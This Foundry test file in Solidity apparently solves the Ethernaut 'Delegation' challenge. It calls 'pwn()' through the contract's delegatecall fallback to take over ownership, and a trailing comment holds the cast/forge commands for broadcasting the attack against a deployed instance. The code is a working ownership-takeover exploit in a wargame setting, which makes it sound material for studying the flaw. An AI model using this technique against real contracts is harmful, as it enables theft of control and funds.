// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegation.sol";

contract DelegationTest is Test {
    Delegation public delegation;
    Delegate public delegate;
    address public owner;
    address public attacker;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        delegate = new Delegate(owner);
        delegation = new Delegation(address(delegate));
    }

    function test_delegateCall() public {
        vm.startPrank(attacker);

        (bool success, ) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Failed to call Delegation contract");
        assertEq(delegation.owner(), address(attacker));

        vm.stopPrank();
    }
}

/*
source .env
export delegation=0xE30d8f86399B51D6c6c7038ff1Bc60305D323DFd
cast call $delegation "owner()" --rpc-url $RPC_URL
forge script script/Delegation.s.sol --broadcast --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
